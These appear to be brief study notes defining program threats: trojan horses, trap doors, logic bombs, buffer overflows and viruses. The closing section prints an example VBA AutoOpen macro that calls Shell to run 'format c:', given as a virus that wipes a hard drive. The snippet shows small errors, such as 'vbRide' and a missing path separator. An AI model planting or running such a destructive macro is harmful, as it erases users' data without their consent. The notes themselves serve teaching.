# Program Threats

- Program threats are **programs** that causes **threats** 🤯

### Trojan Horse

- Pretend to be something else, e.g. any type of program
- Can block, modify, and, delete data
- Installs backdoor (so other programs can access the system using the backdoor)
- Can not self-replicate

### Trap door

- Leave a "hole" for accessing the system, e.g. hardcoded credentials
- A defect in the computer code that allows malicious actors to exploit the flaw and gain access to valuable information

### Logic Bomb

- Activated under certain circumstances e.g. at a specific date/time

### Stack and Buffer Overflow

- Attacker sends data containing **malicious** code to an application, which **stores the data in a stack buffer**

### Virus

- A fragment of code embedded in a legitimate program
- Can self-replicate
- Can spread over a network - infect other machines

- Example of virus that reformats a hard drive (visual basic):
```vb
Sub AutoOpen()
Dim oFS
	Set oFS = CreateObject(''Scripting.FileSystemObject'')
	vs = Shell(''c:command.com /k format c:'', vbRide)
End Sub
```